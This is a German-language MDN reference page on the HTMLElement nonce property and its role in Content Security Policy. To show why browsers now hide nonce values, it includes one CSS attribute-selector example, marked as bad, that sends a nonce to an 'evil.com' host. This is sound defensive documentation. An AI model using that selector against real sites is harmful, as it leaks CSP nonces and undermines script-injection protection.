---
title: "HTMLElement: nonce-Eigenschaft"
short-title: nonce
slug: Web/API/HTMLElement/nonce
l10n:
  sourceCommit: e9b6cd1b7fa8612257b72b2a85a96dd7d45c0200
---

{{APIRef("HTML DOM")}}

Die **`nonce`**-Eigenschaft des [`HTMLElement`](/de/docs/Web/API/HTMLElement)-Interfaces gibt die kryptografische Nummer zurück, die einmal verwendet wird, um vom [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP) zu bestimmen, ob ein bestimmter Abruf ausgeführt werden darf.

In späteren Implementierungen geben Elemente ihr `nonce`-Attribut nur an Skripte weiter (und nicht an Nebenkanäle wie CSS-Attributselektoren).

## Beispiele

### Abrufen eines nonce-Wertes

In der Vergangenheit unterstützten nicht alle Browser das `nonce` IDL-Attribut, daher war ein Workaround, [`getAttribute`](/de/docs/Web/API/Element/getAttribute) als Fallback zu verwenden:

```js
let nonce = script["nonce"] || script.getAttribute("nonce");
```

Allerdings verbergen neuere Browserversionen `nonce`-Werte, die auf diese Weise abgerufen werden (ein leerer String wird zurückgegeben). Die IDL-Eigenschaft (`script['nonce']`) wird der einzige Weg sein, um Nicht-Kopplungen zuzugreifen.

Das Verbergen von Nonce hilft, Angreifer daran zu hindern, Nonce-Daten über Mechanismen zu exfiltrieren, die Daten aus Inhaltsattributen abrufen können, wie diesem CSS-Selektor:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`nonce` globales Attribut](/de/docs/Web/HTML/Reference/Global_attributes/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP)
- CSP: {{CSP("script-src")}}
